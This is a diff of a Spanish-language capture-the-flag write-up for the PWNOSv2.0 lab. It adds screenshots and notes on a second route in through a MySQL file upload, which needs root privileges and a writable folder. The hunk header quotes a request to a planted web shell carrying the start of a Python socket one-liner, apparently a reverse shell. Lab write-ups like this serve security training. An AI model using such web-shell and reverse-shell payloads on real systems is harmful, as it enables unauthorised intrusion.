@@ -352,7 +352,17 @@ http://10.10.10.100/blog/images/cmd.php?cmd=python%20-c%20%27import%20socket,sub
 - Después de resolver el CTF revisé como lo habían resuelto otras personas (puro morbo) y había otro camino interesante:  a través de una carga de archivos en MYSQL. De puro "picón" me puse a resolverlo de esa manera:
 
 
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos19.jpg" width=80% />
 
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos20.jpg" width=80% />
+
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos21.jpg" width=80% />
+
+
+Importante:
+- Este camino resulta mas rapido.
+- Si no fueramos el usuario ROOT no hubiera funcionado.
+- Tuvimos suerte de encontrar una carpeta que permita escribir.
 
 
 
